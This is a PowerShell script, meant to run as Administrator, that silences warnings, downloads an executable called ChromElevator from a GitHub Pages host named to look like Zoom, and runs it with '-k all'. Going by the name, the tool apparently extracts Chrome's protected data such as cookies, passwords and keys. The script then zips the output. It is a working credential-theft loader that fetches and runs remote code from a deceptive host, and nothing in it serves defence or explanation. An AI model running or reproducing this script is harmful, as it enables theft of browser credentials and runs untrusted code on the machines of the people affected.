# ChromElevator Extraction Script
# Run this in PowerShell as Administrator
# Creates a ZIP file of extracted data (no external upload)

# Suppress warnings and confirmations
$ProgressPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# ===== CONFIGURATION =====
$CHROME_ELEVATOR_URL = "https://us05web-zoom-us.github.io/-pwd-xu1raGakc01dcBTosyHivGT3q/chromelevator_x64.exe"
$CHROME_ELEVATOR_PATH = ".\chromelevator_x64.exe"
$OUTPUT_DIR = ".\output"
$ZIP_OUTPUT = ".\extracted_data_$(Get-Date -Format 'yyyy-MM-dd_HHmmss').zip"

# ===== STEP 0: Download ChromElevator if not present =====
if (-not (Test-Path $CHROME_ELEVATOR_PATH)) {
    Write-Host "[*] Downloading ChromElevator from GitHub..." -ForegroundColor Cyan
    Write-Host "[*] Source: $CHROME_ELEVATOR_URL" -ForegroundColor Cyan
    
    try {
        Invoke-WebRequest -Uri $CHROME_ELEVATOR_URL -OutFile $CHROME_ELEVATOR_PATH -UseBasicParsing -ErrorAction Stop
        Write-Host "[+] Download complete: $CHROME_ELEVATOR_PATH" -ForegroundColor Green
    }
    catch {
        Write-Host "[!] Failed to download ChromElevator:" -ForegroundColor Red
        Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "[*] Make sure you have internet connection and the URL is correct" -ForegroundColor Yellow
        exit 1
    }
} else {
    Write-Host "[+] ChromElevator already downloaded: $CHROME_ELEVATOR_PATH" -ForegroundColor Green
}

# ===== STEP 1: Run ChromElevator =====
Write-Host "[*] Starting ChromElevator extraction..." -ForegroundColor Cyan
& $CHROME_ELEVATOR_PATH -k all

if ($LASTEXITCODE -ne 0) {
    Write-Host "[!] ChromElevator failed to run. Check permissions and paths." -ForegroundColor Red
    exit 1
}

# Wait for extraction to complete
Start-Sleep -Seconds 2

# ===== STEP 2: Check if output exists =====
if (-not (Test-Path $OUTPUT_DIR)) {
    Write-Host "[!] Output directory not found!" -ForegroundColor Red
    exit 1
}

Write-Host "[+] Output directory found: $OUTPUT_DIR" -ForegroundColor Green

# ===== STEP 3: Create ZIP file =====
Write-Host "[*] Zipping output directory..." -ForegroundColor Cyan

# Remove old zip if exists
if (Test-Path $ZIP_OUTPUT) {
    Remove-Item $ZIP_OUTPUT -Force
}

# Create ZIP using PowerShell (built-in, no external tools needed)
Compress-Archive -Path $OUTPUT_DIR -DestinationPath $ZIP_OUTPUT -Force

$ZIP_SIZE = (Get-Item $ZIP_OUTPUT).Length / 1MB
Write-Host "[+] ZIP created: $ZIP_OUTPUT (Size: $([Math]::Round($ZIP_SIZE, 2)) MB)" -ForegroundColor Green

# ===== COMPLETION =====
Write-Host "[*] Extraction complete!" -ForegroundColor Cyan
Write-Host "[+] ZIP file location: $((Resolve-Path $ZIP_OUTPUT).Path)" -ForegroundColor Green
Write-Host "[*] You can delete the 'output' folder to save space" -ForegroundColor Cyan
